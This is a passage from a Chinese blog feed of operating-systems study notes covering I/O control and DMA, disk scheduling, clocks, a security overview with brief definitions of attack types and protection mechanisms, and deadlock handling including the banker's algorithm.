<p>对于运行时可能的出错进行纠正</p>
</li>
<li><p>Copy it to main memory</p>
<p>将字节复制到主存</p>
</li>
</ul>
<p><em>注: 一个设备控制器可能同时负责多个机械设备</em></p>
<p>此外每个设备控制器都拥有一些寄存器用于与OS通信:</p>
<ul>
<li>OS通过写入寄存器来命令设备执行操作等</li>
<li>OS通过读取寄存器来获取设备的状态</li>
</ul>
<p>除了寄存器外, 许多设备还有OS可以读取/写入的数据缓冲区</p>
<h3 id="与OS的通信方式"><a href="#与OS的通信方式" class="headerlink" title="与OS的通信方式"></a>与OS的通信方式</h3><p>OS和控制器的通信可以分为三种方式 ⭐</p>
<p><img src="https://my-pic-bed-1302358960.cos.ap-nanjing.myqcloud.com/Blog/202008/15/mmio.png" alt=""></p>
<ol>
<li><p>独立空间</p>
<p>每个控制寄存器器都分配有一个单独的IO端口号</p>
<p>内存的地址空间和IO的地址空间完全独立</p>
</li>
<li><p>内存映射 </p>
<p>将所有的控制寄存器映射到内存空间.</p>
<p>这些被映射的内存空间不会被其他内存映射, 只能由控制寄存器使用</p>
<p><strong>优点</strong></p>
<ol>
<li>, a I/O device driver can be written entirely in C. Otherwise, some assembly code is needed</li>
<li>No special protection mechanism is needed to keep user processes from performing I/O.</li>
<li>Every instructions that can reference memory can also reference control registers.</li>
</ol>
</li>
<li><p>混合</p>
<p>IO数据缓冲区采用内存映射, 寄存器采用独立空间</p>
</li>
</ol>
<p>IO软件层次: 驱动</p>
<p>需要实现:</p>
<ul>
<li>设备独立性, 设备在接入前不需要任何特殊处理</li>
<li>统一命名</li>
<li>纠错(贴近硬件层, 不需要OS费心)</li>
<li>异步传输</li>
<li>缓冲区</li>
<li>共享设备&amp;专业设备</li>
</ul>
<h3 id="IO控制方式-⭐"><a href="#IO控制方式-⭐" class="headerlink" title="IO控制方式 ⭐"></a>IO控制方式 ⭐</h3><ol>
<li><p>程序控制IO  Programmed I/O </p>
<p>使用程序不断查询设备以了解是否就绪, 忙等待, 低效 浪费CPU</p>
</li>
<li><p>中断控制IO  Interrupt-Driven I/O </p>
<p>允许CPU在IO工作时干其他时, 当IO完毕时发出中断.</p>
<p>问题在于IO每次只能传输一个字符, 中断频率过高</p>
</li>
<li><p>DMA控制IO⭐  I/O Using DMA </p>
<p>DMA控制器Direct Memory Access 是一个能够独立于CPU访问系统总线的控制器, 相当于一个字符缓冲池, 当缓冲池满了再向CPU发出中断信号.</p>
<blockquote>
<p>DMA controller <strong>has access to the system bus independent of the CPU</strong>. It contains several registers that can be written and read by the CPU</p>
</blockquote>
<p><img src="https://my-pic-bed-1302358960.cos.ap-nanjing.myqcloud.com/Blog/202008/15/dmA.png" alt=""></p>
<ol>
<li>CPU向DMA发出指令(而后CPU继续运行其他进程)</li>
<li>DMA向IO控制器发送传输指令</li>
<li>IO控制器与存储单元传输数据</li>
<li>传输控制器回应DMA</li>
<li>DMA向CPU发出IO中断信号(CPU处理)</li>
</ol>
</li>
</ol>
<h3 id="IO软件层次"><a href="#IO软件层次" class="headerlink" title="IO软件层次"></a>IO软件层次</h3><p>中断处理</p>
<p>最好是隐藏的, 不被感知. </p>
<p>一般需要大量时间, 负责设备与设备驱动之间的通信.</p>
<p>设备驱动器</p>
<p>设备独立性 : 设备在接入前不需要任何特殊处理</p>
<p>统一接口</p>
<p>缓冲区</p>
<p>​    双BUFFER区(乒乓机制)</p>
<h2 id="盘"><a href="#盘" class="headerlink" title="盘"></a>盘</h2><ol>
<li><p>每个byte由 14个bits构成</p>
</li>
<li><p>每42个byte构成1个帧(frame)</p>
<p>但是每frame种只有24byte用于记录数据, 剩下的用于校验和控制</p>
</li>
<li><p>98个帧构成扇区sector </p>
<p>每个扇区有16byte的引导符preamble, 后面又有288byte的ECC(纠错)</p>
</li>
</ol>
<p>柱面斜进, 每圈的零扇区在磁盘上不是位于同一条直线上.</p>
<p>磁盘交错. </p>
<p><img src="https://my-pic-bed-1302358960.cos.ap-nanjing.myqcloud.com/Blog/202008/15/DISK%20FORMAT.png" alt=""></p>
<ol>
<li>无交错, 每个扇区顺序排列</li>
<li>单交错</li>
<li>双交错</li>
</ol>
<p><em>(以上了解)</em></p>
<h3 id="磁盘臂调度算法⭐"><a href="#磁盘臂调度算法⭐" class="headerlink" title="磁盘臂调度算法⭐"></a>磁盘臂调度算法⭐</h3><p>磁盘在读写过程种有三个时间决定: </p>
<ul>
<li><p>寻道时间Seek Time </p>
<p>将磁盘臂移动到适当的柱面上需要的时间</p>
</li>
<li><p>旋转延迟Rotational delay</p>
<p>等待适当的扇区旋转到磁头下的时间</p>
</li>
<li><p>数据传输时间Actual data trasfer time.</p>
<p>相比前面两个来说非常小</p>
</li>
</ul>
<p>传输时间相对忽略不计, 旋转延迟由机械决定, 讨论寻道时间</p>
<h4 id="FCFS"><a href="#FCFS" class="headerlink" title="FCFS"></a>FCFS</h4><p>按照柱面访问顺序进行访问. </p>
<h4 id="Shortest-Seek-Frist-最近柱面优先"><a href="#Shortest-Seek-Frist-最近柱面优先" class="headerlink" title="Shortest Seek Frist 最近柱面优先"></a>Shortest Seek Frist 最近柱面优先</h4><p>每次都访问离当前最近的</p>
<h4 id="The-elevator-algorithm-电梯调度"><a href="#The-elevator-algorithm-电梯调度" class="headerlink" title="The elevator algorithm 电梯调度"></a>The elevator algorithm 电梯调度</h4><p>每次都从头到尾,再从尾到头</p>
<h2 id="时钟"><a href="#时钟" class="headerlink" title="时钟"></a>时钟</h2><p>作用⭐</p>
<ol>
<li><p>Maintaining the time of day  维持一天中的时间。 </p>
</li>
<li><p>Preventing pro running longer  防止进程运行超出允许的时间</p>
<p>在启动进程时设定一个计数器, 每个时钟中断处将计数器—, When it gets to zero, the clock driver calls the scheduler to set up another process.</p>
</li>
<li><p>Accounting for CPU usage  计算CPU使用率</p>
<p>每当启动进程时，启动一个不同于主系统计时器的第二个计时器。当该过程停止时，可以读出计时器以告知该过程已运行了多长时间。</p>
</li>
<li><p>Handling the alarm system call  处理用户进程发出的警报系统调用</p>
</li>
<li><p>Providing watchdog timers  为系统本身的各个部分提供监视定时器</p>
<p>例如: 在一定时间间隔内未确认的数据包必须重新发送</p>
</li>
</ol>
<p><em><u>其他了解即可</u></em></p>
<h2 id="Network-terminals-网络终端"><a href="#Network-terminals-网络终端" class="headerlink" title="Network terminals                    网络终端"></a>Network terminals                    网络终端</h2><h3 id="两类终端"><a href="#两类终端" class="headerlink" title="两类终端"></a>两类终端</h3><ul>
<li><p>胖终端  X Windows</p>
<p>终端具有大量的计算能力和内存，以便运行复杂的协议来压缩通过网络发送的数据量。 </p>
</li>
<li><p>瘦终端 SLIM</p>
<p>终端非常简单，基本上是显示像素，并且为了使其便宜而没有做太多的复杂设计</p>
</li>
</ul>
<p><em><u>其他了解即可</u></em></p>
<hr>
<p><strong>操作系统系列</strong></p>
<ol>
<li>🔗<a href="https://luy-hb.xyz/2020/08/14/操作系统之概述/" target="_blank" rel="noopener">操作系统之概述</a></li>
<li>🔗<a href="https://luy-hb.xyz/2020/06/05/操作系统之进程线程/" target="_blank" rel="noopener">操作系统之进程线程</a></li>
<li>🔗<a href="https://luy-hb.xyz/2020/06/08/操作系统之进程间通信/" target="_blank" rel="noopener">操作系统之进程间通信</a></li>
<li>🔗<a href="https://luy-hb.xyz/2020/08/04/操作系统之死锁/" target="_blank" rel="noopener">操作系统之死锁</a></li>
<li>🔗<a href="https://luy-hb.xyz/2020/06/09/操作系统之内存管理/" target="_blank" rel="noopener">操作系统之内存管理</a></li>
<li>操作系统之IO管理  (本文)</li>
<li>🔗<a href="https://luy-hb.xyz/2020/08/06/操作系统之文件系统/" target="_blank" rel="noopener">操作系统之文件系统</a></li>
<li>🔗<a href="https://luy-hb.xyz/2020/08/08/操作系统之多处理器系统/" target="_blank" rel="noopener">操作系统之多处理器系统</a></li>
<li>🔗<a href="https://luy-hb.xyz/2020/08/11/操作系统之安全/" target="_blank" rel="noopener">操作系统之安全</a></li>
</ol>
]]></content>
      <categories>
        <category>学习笔记</category>
        <category>专业课</category>
        <category>操作系统</category>
      </categories>
      <tags>
        <tag>学习笔记</tag>
        <tag>操作系统</tag>
      </tags>
  </entry>
  <entry>
    <title>操作系统之安全</title>
    <url>/2020/08/11/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%E4%B9%8B%E5%AE%89%E5%85%A8/</url>
    <content><![CDATA[<p>本章将涉及:</p>
<ol>
<li>安全与威胁</li>
<li>简易密码学(真的很简易!)</li>
<li>用户认证</li>
<li>系统受到的攻击<ol>
<li>来自内部</li>
<li>来自外部</li>
</ol>
</li>
<li>保护机制</li>
<li>信任系统</li>
<li>OS安全</li>
</ol>
<p><em>本文匆匆赶制, 内容粗糙简陋</em></p>
<a id="more"></a>
<h2 id="安全与威胁"><a href="#安全与威胁" class="headerlink" title="安全与威胁"></a>安全与威胁</h2><div class="table-container">
<table>
<thead>
<tr>
<th>Goal</th>
<th>Threat</th>
</tr>
</thead>
<tbody>
<tr>
<td>Data confidentiality 数据机密性</td>
<td>Exposure of data 数据泄露</td>
</tr>
<tr>
<td>Data integrity           数据完整性</td>
<td>Tampering with data 数据篡改</td>
</tr>
<tr>
<td>System available     系统可用性</td>
<td>Denial of service      拒绝服务</td>
</tr>
</tbody>
</table>
</div>
<p>首先保护数据的机密性, 防止数据泄露.   需要保证数据不被外界所知.</p>
<p>其次要保证数据的完整性, 防止数据被破坏.  不能被外界破坏.</p>
<p>最后要保证系统的可用性, 防止系统拒绝服务. 例如DoS攻击等</p>
<p>入侵者 intruder or sometimes 敌人 adversary<br>a) Passive intruders(被动入侵者)- to read files they are not authorized to<br>read<br>b) Active intruders(主动入侵者)- to make unauthorized changes to data</p>
<p>常见的安全入侵场景有:</p>
<ol>
<li>Casual prying (窥探) by nontechnical users     被非专业使用者随意窥探</li>
<li>Snooping by insiders  被内部人员窥视</li>
<li>Determined attempt to make money  为了利益</li>
<li>Commercial or military espionage   商业或军事间谍</li>
</ol>
<p>常见的数据丢失场景有:</p>
<ol>
<li><p>天灾</p>
<p>fires, floods, wars</p>
</li>
<li><p>软硬件错误</p>
<p>CPU malfunction, bad disk, program bugs </p>
</li>
<li><p>人为错误</p>
<p>data entry, wrong tape mounted</p>
<hr>
</li>
</ol>
<h2 id="密码学基础"><a href="#密码学基础" class="headerlink" title="密码学基础"></a>密码学基础</h2><p><em><u>了解即可</u></em></p>
<h3 id="例子"><a href="#例子" class="headerlink" title="例子"></a>例子</h3><ul>
<li>斯巴达将军</li>
<li>戚继光: 反切注音法</li>
<li>周恩来: 豪密</li>
<li>菲利普与玛丽女王</li>
<li>一战: 齐默尔曼电报</li>
<li>二战: Enigma密码机, 图灵</li>
</ul>
<h3 id="历史"><a href="#历史" class="headerlink" title="历史"></a>历史</h3><ul>
<li>? - 1949 古典密码<ul>
<li>密码学还不是科学, 而是艺术</li>
<li>数据的安全<strong>基于算法的保密</strong></li>
<li>一般的加密方法是<strong>替换</strong></li>
<li>单表替换密码(凯撒密码), 多表替换密码(Playfair密码, Hill密码) , 转轮密码(Enigma)</li>
</ul>
</li>
<li>1949 - 1975 复杂计算的密码<ul>
<li>由于算力提升使得复杂计算的密码称为可能</li>
<li>1949年,香农发表了&lt;&lt;保密系统的信息理论&gt;&gt;(The Communication Theory of Secrecy Systems), 它证明了密码编码 学是如何置于坚实的数学基础之上的，从此密码学发展成为 一个专门学科。——标志性事件 </li>
<li>数据的安全<strong>基于密钥</strong>而不是算法的保密</li>
</ul>
</li>
<li>1975 - 公钥密码<ul>
<li>公钥密码学成为主要研究方向 </li>
<li><strong>公钥密码</strong>使得发送端和接收端<strong>无密钥传输的保密通信</strong>成为可能</li>
</ul>
</li>
</ul>
<h3 id="分类"><a href="#分类" class="headerlink" title="分类"></a>分类</h3><h4 id="对称加密"><a href="#对称加密" class="headerlink" title="对称加密"></a>对称加密</h4><ul>
<li>传统密码/常规密码/私钥密码/单钥密码 conventional / private-key / single-key</li>
<li>发送方和接收方共享一个共同的密钥</li>
<li>20世纪70年代以前私钥密码是唯一类型 </li>
<li>至今仍广泛应用</li>
</ul>
<h4 id="非对称加密"><a href="#非对称加密" class="headerlink" title="非对称加密"></a>非对称加密</h4><ul>
<li>公钥/双钥/非对称密码都是指使用两个密钥: <ul>
<li>公钥：可以对任何人公开的密钥，用于加密消息或 验证签名。 </li>
<li>私钥：只能由接收者私存，用于解密消息或签名。 </li>
</ul>
</li>
<li>非对称 <ul>
<li>用于加密消息或验证签名的人不能进行消息的加密或消息的签名。</li>
</ul>
</li>
</ul>
<hr>
<h2 id="用户认证⭐"><a href="#用户认证⭐" class="headerlink" title="用户认证⭐"></a>用户认证⭐</h2><p>Authentication<br>user authentication（用户验证） crackers（骇客）</p>
<p>认证必须要能够标识使用者的身份</p>
<p>用户认证应当在使用系统之前完成</p>
<p>三种认证方式</p>
<ol>
<li><p>Something the user knows</p>
<p>密码, 口令</p>
</li>
<li><p>Something the user has</p>
<p>钥匙, 芯片, 动态密码, 验证码</p>
</li>
<li><p>Something the user is</p>
<p>指纹, 虹膜</p>
</li>
</ol>
<blockquote>
<p>UNIX 安全系统会对输入的密码进行<strong>加盐</strong>(Salt), 即将每一个口令同一个叫做盐（Salt）的n位随机数相关联。无论何时口令改变，这个随机数就改变。将口令和随机数连接起来，一同加密，加密后的结果存放进口令文件。</p>
<p>One-Time passwords 对于函数 y=f(x) 已知y求x的难度远大于已知x求y的难度. </p>
</blockquote>
<h3 id="一些用户认证时的对策"><a href="#一些用户认证时的对策" class="headerlink" title="一些用户认证时的对策"></a>一些用户认证时的对策</h3><ul>
<li>Limiting times when someone can log in    限制登录时间</li>
<li>Automatic callback at number prespecified   自动回调 (例如判断密码是否太过简单)</li>
<li>Limited number of login tries   限制尝试的登录次数</li>
<li>A database of all logins    记录所有尝试登录的数据</li>
<li>Simple login name/password as a trap  使用简单的密码作为陷阱 (假装登陆成功)</li>
<li>security personnel notified when attacker bites 当检测到攻击者时通知安全人员</li>
</ul>
<hr>
<h2 id="系统受到的攻击"><a href="#系统受到的攻击" class="headerlink" title="系统受到的攻击"></a>系统受到的攻击</h2><h3 id="Insider-Attacks-内部攻击"><a href="#Insider-Attacks-内部攻击" class="headerlink" title="Insider Attacks 内部攻击"></a>Insider Attacks 内部攻击</h3><h4 id="Logic-Bombs"><a href="#Logic-Bombs" class="headerlink" title="Logic Bombs"></a>Logic Bombs</h4><p>（逻辑炸弹）由一些公司的编程人员或使用这些受保护的计算机、编制核心软件的员工实施.秘密的嵌在产品的操作系统中的代码，特定情况下爆炸</p>
<h4 id="Trap-Doors"><a href="#Trap-Doors" class="headerlink" title="Trap Doors"></a>Trap Doors</h4><p>（后门）系统程序员跳过正常的认证过程并插入一段代码造成<br>的。代码审查 code review</p>
<h4 id="Login-Spoofing"><a href="#Login-Spoofing" class="headerlink" title="Login Spoofing"></a>Login Spoofing</h4><p>（登录欺骗）假冒的登录屏幕</p>
<h4 id="Trojan-Horses"><a href="#Trojan-Horses" class="headerlink" title="Trojan Horses"></a>Trojan Horses</h4><p>特洛伊木马 诱导用户运行攻击代码</p>
<h4 id="Buffer-Overflow"><a href="#Buffer-Overflow" class="headerlink" title="Buffer Overflow"></a>Buffer Overflow</h4><p>缓冲区溢出攻击</p>
<h3 id="Outside-Attacks-外部攻击"><a href="#Outside-Attacks-外部攻击" class="headerlink" title="Outside Attacks 外部攻击"></a>Outside Attacks 外部攻击</h3><h4 id="Virus"><a href="#Virus" class="headerlink" title="Virus"></a>Virus</h4><p>病毒: 不断地复制自身并传播</p>
<h4 id="Morris-Worm"><a href="#Morris-Worm" class="headerlink" title="Morris Worm"></a>Morris Worm</h4><p>蠕虫: 先潜伏自己的存在, 直到传播到一定规模后再爆发</p>
<p>(zero-day Attack</p>
<p>Zombie</p>
<p>…</p>
<h2 id="系统设计的原则"><a href="#系统设计的原则" class="headerlink" title="系统设计的原则"></a>系统设计的原则</h2><ol>
<li>System design should be public </li>
<li>Default should be no access </li>
<li>Check for current authority </li>
<li>Give each process least privilege possible </li>
<li>Protection mechanism should be 保护机制应当<ul>
<li>simple 简单</li>
<li>uniform  统一</li>
<li>in lowest layers of system  处于系统底层</li>
</ul>
</li>
<li>Scheme should be psychologically acceptable</li>
</ol>
<h2 id="保护机制-⭐"><a href="#保护机制-⭐" class="headerlink" title="保护机制 ⭐"></a>保护机制 ⭐</h2><h3 id="Protection-Domains"><a href="#Protection-Domains" class="headerlink" title="Protection Domains"></a>Protection Domains</h3><p>注: 下文中提到的 <em>用户</em> 也可能指进程</p>
<p>保护域</p>
<p>a domain is a set of （object， right） pairs. Each pair specifies an object and some<br>subset of the operations that can be performed. A right means permission to perform one of the operations.<br>一对对象权限的组合，每对组合指定一个对象和一些可在上面运行的操作子集指对某个操作的执行许可.</p>
<p>人话: 一张表, 记录了所有的文件和每个用户允许对文件进行的操作</p>
<p>缺点: 太大</p>
<h3 id="Access-Control-Lists-ACL"><a href="#Access-Control-Lists-ACL" class="headerlink" title="Access Control Lists , ACL"></a>Access Control Lists , ACL</h3><p>访问控制列表</p>
<p>每个对象的有序列表里包含了所有可访问对象的域以及这些域如何访问这些对象的方法</p>
<p>人话: 由于文件多而域少, 因此在每个文件处记录哪些域能进行什么操作. 将保护域按文件分解</p>
<h3 id="Capabilities"><a href="#Capabilities" class="headerlink" title="Capabilities"></a>Capabilities</h3><p>权能字</p>
<p>使用按行存储时，与每个进程关联的是可访问的对象列表，以及每个对象上叫做权能字列表，每个单独的项目叫做权能字</p>
<p>人话: 每个用户自己储存对每个文件能进行什么操作, 将保护域按用户分解</p>
<p>因此要防止权能字被用户自己篡改(三种方法)</p>
<ol>
<li>First way, require a tagged architecture </li>
<li>Second way, keep the C-list inside the OS </li>
<li>Third way, keep the C-list in user space, but manage the capabilities cryptographically</li>
</ol>
<h2 id="可信任系统"><a href="#可信任系统" class="headerlink" title="可信任系统"></a>可信任系统</h2><p>完全可信任的系统是否存在?</p>
<p>可信任系统的核心是 <strong>可信计算基Trusted Computing Base, TCB</strong></p>
<p>TCB 是一种机制, 保护所有敏感操作; (例如切换进程, 进程创建, 内存映射管理等) 任何试图访问这些操作的进程必须通过可信计算基的安全审查, 称为 reference monitor (访问监视器)</p>
<blockquote>
<p>All system calls go through the reference monitor for security checking</p>
</blockquote>
<p>TCB可以通过硬件, 软件, 固件的形式实现, 它只是个机制. </p>
<p>一旦可信计算机基的某个构件出现程序错误或者安全隐患，就对整个系统的安全造成危害。 与之相反，如果除可信计算基之外的系统的其他部分出现问题，也只是泄漏了系统安全策略赋予它们的相关权限而已，这些权限一般都是比较低的。</p>
<p>现代操作系统努力降低TCB的大小，使得对其代码库彻底的检查成为可能.</p>
<hr>
<p><strong>操作系统系列</strong></p>
<ol>
<li>🔗<a href="https://luy-hb.xyz/2020/08/14/操作系统之概述/" target="_blank" rel="noopener">操作系统之概述</a></li>
<li>🔗<a href="https://luy-hb.xyz/2020/06/05/操作系统之进程线程/" target="_blank" rel="noopener">操作系统之进程线程</a></li>
<li>🔗<a href="https://luy-hb.xyz/2020/06/08/操作系统之进程间通信/" target="_blank" rel="noopener">操作系统之进程间通信</a></li>
<li>🔗<a href="https://luy-hb.xyz/2020/08/04/操作系统之死锁/" target="_blank" rel="noopener">操作系统之死锁</a></li>
<li>🔗<a href="https://luy-hb.xyz/2020/06/09/操作系统之内存管理/" target="_blank" rel="noopener">操作系统之内存管理</a></li>
<li>🔗<a href="https://luy-hb.xyz/2020/08/05/操作系统之IO管理/" target="_blank" rel="noopener">操作系统之IO管理</a></li>
<li>🔗<a href="https://luy-hb.xyz/2020/08/06/操作系统之文件系统/" target="_blank" rel="noopener">操作系统之文件系统</a></li>
<li>🔗<a href="https://luy-hb.xyz/2020/08/08/操作系统之多处理器系统/" target="_blank" rel="noopener">操作系统之多处理器系统</a></li>
<li>操作系统之安全  (本文)</li>
</ol>
]]></content>
      <categories>
        <category>学习笔记</category>
        <category>专业课</category>
        <category>操作系统</category>
      </categories>
      <tags>
        <tag>学习笔记</tag>
        <tag>操作系统</tag>
      </tags>
  </entry>
  <entry>
    <title>操作系统之死锁</title>
    <url>/2020/08/04/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%E4%B9%8B%E6%AD%BB%E9%94%81/</url>
    <content><![CDATA[<p>本章包括以下内容:</p>
<ol>
<li>资源与死锁</li>
<li>处理死锁<ol>
<li>冷处理: 鸵鸟算法</li>
<li>热处理: 死锁的检测与恢复</li>
</ol>
</li>
<li>防范死锁<ol>
<li>避免死锁</li>
<li>死锁预防</li>
</ol>
</li>
<li>其他策略</li>
</ol>
<a id="more"></a>
<h2 id="资源与死锁"><a href="#资源与死锁" class="headerlink" title="资源与死锁"></a>资源与死锁</h2><h3 id="资源定义与分类"><a href="#资源定义与分类" class="headerlink" title="资源定义与分类"></a>资源定义与分类</h3><p>计算机中具有 <strong>排他性使用</strong> 的对象称为 <strong><u>资源</u></strong> . (即每次只允许一个进程访问). 资源可以是硬件(设备)或软件(信息). 资源随着时间推移必须能<u>获得, 使用, 以及释放</u>.</p>
<ul>
<li>可抢占式资源: B进程可以将资源R从进程A出抢占<strong>而不会产生任何副作用</strong>. 例如储存器.</li>
<li>不可抢占式资源: 在不引起相关失败的情况下, 无法将资源从占有它的进程处抢占过来.例如打印机.</li>
</ul>
<p><u>死锁仅可能出现在不可抢占式资源上.</u></p>
<p>资源的使用流程:</p>
<ol>
<li>申请资源</li>
<li>使用资源</li>
<li>释放资源</li>
</ol>
<p><em>当资源申请失败时,不同系统会采取不同反应: 阻塞申请(等待唤醒) 或 返回错误 (用户决定)</em> </p>
<h3 id="死锁定义"><a href="#死锁定义" class="headerlink" title="死锁定义"></a>死锁定义</h3><blockquote>
<p>如果一个进程集合中的每个进程都在等待只能由该进程集合中的其他进程才能引发的事件, 那么称这个进程集合的 <strong><u>死锁</u></strong> 的.</p>
<p><em>A set of processes is deadlocked if each process in the set is waiting for an event that only another process in the set can cause</em> </p>
</blockquote>
<p><del>显然这个定义太正经了大家都知道死锁是什么.</del></p>
<p>当发生死锁时, 任何一个进程都无法: 运行 / 释放资源 / 被唤醒</p>
<h3 id="死锁的四个必要条件⭐"><a href="#死锁的四个必要条件⭐" class="headerlink" title="死锁的四个必要条件⭐"></a>死锁的四个必要条件⭐</h3><ul>
<li><p>互斥条件 <strong>Mutual exclusion</strong> condition</p>
<p>每个资源要么被分给了一个进程, 要么是可用的</p>
</li>
<li><p>占有并等待  <strong>Hold and wait</strong> condition </p>
<p>进程可以在占有资源A的同时等待资源B的分配</p>
</li>
<li><p>不可抢占  <strong>No preemption</strong> condition </p>
<p>已经被分配的资源不可抢占, 只能等待占有它的进程主动释放</p>
</li>
<li><p>环路等待  <strong>Circular wait</strong> condition</p>
<p>系统中有多于一个的进程, 每个进程都在等待下一个进程占有的资源</p>
</li>
</ul>
<p><u>死锁发生时四个条件必须同时满足, 只要使任一条件不被满足即可预防死锁.</u></p>
<h3 id="死锁建模"><a href="#死锁建模" class="headerlink" title="死锁建模"></a>死锁建模</h3><p>圆形表示进程; 方形表示资源; </p>
<p>资源指向进程: 该资源已被进程占用;</p>
<p>进程指向资源: 该进程正在等待资源;</p>
<p><img src="https://my-pic-bed-1302358960.cos.ap-nanjing.myqcloud.com/Blog/202008/04/%E6%AD%BB%E9%94%81%E5%BB%BA%E6%A8%A1.png" alt=""></p>
<p>例如, 上图中进程C在等待被进程D占有的资源T, 进程D在等待被进程C占有的资源U.</p>
<p><em>如果模型中有闭合有向环, 表明存在死锁.</em></p>
<hr>
<h2 id="处理死锁⭐"><a href="#处理死锁⭐" class="headerlink" title="处理死锁⭐"></a>处理死锁⭐</h2><h3 id="冷处理-鸵鸟算法"><a href="#冷处理-鸵鸟算法" class="headerlink" title="冷处理: 鸵鸟算法"></a>冷处理: 鸵鸟算法</h3><p>假装没有问题, 如果进程执行时间过长就重启一下…</p>
<p>这是由于死锁的产生是取决于进程执行的精确时序, 在同一进程集合的多次运行中可能死锁的出现是非常偶然的; 此外处理死锁的开销往往非常高昂.</p>
<p>实际中本算法效果较好</p>
<h3 id="热处理-检测并恢复"><a href="#热处理-检测并恢复" class="headerlink" title="热处理: 检测并恢复"></a>热处理: 检测并恢复</h3><p>系统并不会防范死锁的产生, 而是在死锁发生之后再进行死锁的检测与恢复.</p>
<h4 id="死锁的检测"><a href="#死锁的检测" class="headerlink" title="死锁的检测"></a>死锁的检测</h4><p><strong>DFS算法</strong>: (了解)</p>
<p>依次将每一个节点作为一棵树的根节点, 并进行深度优先搜索, 如果再次遇到该节点表明找到了环.</p>
<p><strong>剪枝算法</strong>: </p>
<p>如果某进程只申请不占有, 将该节点剪去;如果某资源只被占有不被申请, 将该节点剪去;重复这两步直到无法剪去, 存在环.</p>
<p><strong>矩阵检测</strong>: (了解)</p>
<p>E 矩阵: 所有资源的总数; A矩阵: 所有资源当前空余量;</p>
<p>C矩阵: $C_{ij}$ 表示进程 $ i $  当前使用资源 $j$ 的数目;</p>
<p>R矩阵: $R_{ij}$ 表示进程 $ i $  当前需要资源 $j$ 的数目;</p>
<p><img src="https://my-pic-bed-1302358960.cos.ap-nanjing.myqcloud.com/Blog/202008/04/%E7%9F%A9%E9%98%B5%E6%A3%80%E6%B5%8B.png" alt=""></p>
<p>必定存在以下公式:</p>
<script type="math/tex; mode=display">
\sum^n_{i=1}C_{ij} +A_j=E_j</script><p>如果当前的A矩阵可以使R矩阵按照一定顺序退出, 说明未形成死锁.</p>
<p>但死锁检测本身即浪费时间, 又需要定期检测, 所以热处理本身效果不佳.</p>
<h4 id="死锁的恢复"><a href="#死锁的恢复" class="headerlink" title="死锁的恢复"></a>死锁的恢复</h4><ul>
<li><p>资源抢占</p>
<p>将资源强制抢占(例如人工干预)</p>
</li>
<li><p>状态回滚</p>
<p>从之前某个状态重新加载, 重新跑未必发生死锁</p>
</li>
<li><p>杀死进程</p>
<p>杀死一个或若干个进程, 直到打破死锁.</p>
</li>
</ul>
<hr>
<h2 id="防范死锁⭐"><a href="#防范死锁⭐" class="headerlink" title="防范死锁⭐"></a>防范死锁⭐</h2><h3 id="避免死锁"><a href="#避免死锁" class="headerlink" title="避免死锁"></a>避免死锁</h3><h4 id="资源轨迹图"><a href="#资源轨迹图" class="headerlink" title="资源轨迹图"></a>资源轨迹图</h4><p>当走向轨迹穿越阴影重叠区时<strong>有可能</strong>发生死锁. </p>
<p><img src="https://my-pic-bed-1302358960.cos.ap-nanjing.myqcloud.com/Blog/202008/04/%E8%B5%84%E6%BA%90%E5%9B%BE.png" alt=""></p>
<h4 id="安全态"><a href="#安全态" class="headerlink" title="安全态"></a>安全态</h4><p>安全态: 如果没有死锁发生,即使所有进程突然请求最大的资源需求, 也存在某种调度次序使得每一个进程都运行完毕.</p>
<p>不安全态: 如果没有死锁发生,若所有进程突然请求最大的资源需求, 不存在某种调度次序使得每一个进程都运行完毕.</p>
<p><u>注意: 不安全态不代表一定发生死锁, 但死锁发生一定经过不安全态.</u></p>
<h4 id="银行家算法"><a href="#银行家算法" class="headerlink" title="银行家算法"></a>银行家算法</h4><p><img src="https://my-pic-bed-1302358960.cos.ap-nanjing.myqcloud.com/Blog/202008/04/%E9%93%B6%E8%A1%8C%E5%AE%B6.png" alt=""></p>
<p>如果A向量能够使用某种次序分配能够使所有进程安全退出就处于安全状态;</p>
<p>如果一直使其处于安全状态则可以避免死锁.</p>
<blockquote>
<p>实际上银行家算法缺少使用价值, 很少有进程在运行前知道需要多少资源, 而且进程数也在随时变化(新任务产生), 而且资源的状态也随时可能变化(例如打印机坏了).</p>
</blockquote>
<h3 id="预防死锁"><a href="#预防死锁" class="headerlink" title="预防死锁"></a>预防死锁</h3><p>从理论上完全避免死锁的不可能的(因为需要获知未来的请求) , 但是我们可以通过对死锁的四个必要条件的破坏来预防死锁的产生.</p>
<p><del>其实我觉得预防和避免这种文字游戏没啥意义,但是确实不知道怎么区分</del></p>
<h4 id="破坏互斥条件"><a href="#破坏互斥条件" class="headerlink" title="破坏互斥条件"></a>破坏互斥条件</h4><p>如果资源不被一个进程独占, 则不会产生死锁. </p>
<p>具体做法是将打印机使用假脱机, 即IO输出实际上是将文件发送至打印机的磁盘中, 再由打印机的控制程序慢慢打印磁盘的内容. 而多个进程可以同时对磁盘输出, 破坏了互斥条件.</p>
<p>但如果在某些情况下磁盘本身成为了互斥的资源, 这种方法就失效了</p>
<h4 id="破坏占有并等待"><a href="#破坏占有并等待" class="headerlink" title="破坏占有并等待"></a>破坏占有并等待</h4><p>禁止已持有资源的进程再申请其他资源.</p>
<p>一种实现方式是在进程开始时申请好全部资源. 但是这是无法实现的 (如果能实现为什么不用银行家呢?) 此外一次性分配资源也是巨大的浪费.</p>
<p>另一种实现方式是在申请新资源的时候先释放本来占有的资源. 但是开销大也不佳.</p>
<h4 id="破坏不可抢占条件"><a href="#破坏不可抢占条件" class="headerlink" title="破坏不可抢占条件"></a>破坏不可抢占条件</h4><p>通过将资源(主要指硬件设备)虚拟化可以使其能够抢占. 但是并不是所有资源都能够虚拟化的. 而且消除了打印机的死锁也可能带来硬盘的死锁.</p>
<h4 id="破坏环路等待条件"><a href="#破坏环路等待条件" class="headerlink" title="破坏环路等待条件"></a>破坏环路等待条件</h4><p>一种实现方式是每次只允许占据一个资源, 但是这显然不能接受的.</p>
<p>另一种方式是对所有资源进行编号, 某进程每次请求的资源不能是比自己占有的资源序号低的资源. 这样资源分配图中肯定不会出现环 (而是一条链).这种方式也几乎不能找到一个令人满意的编号次序.</p>
<hr>
<h2 id="其他策略"><a href="#其他策略" class="headerlink" title="其他策略"></a>其他策略</h2><ul>
<li>Two-Phase Locking</li>
<li>Non-resource Deadlocks</li>
<li>Starvation</li>
<li>….</li>
</ul>
<hr>
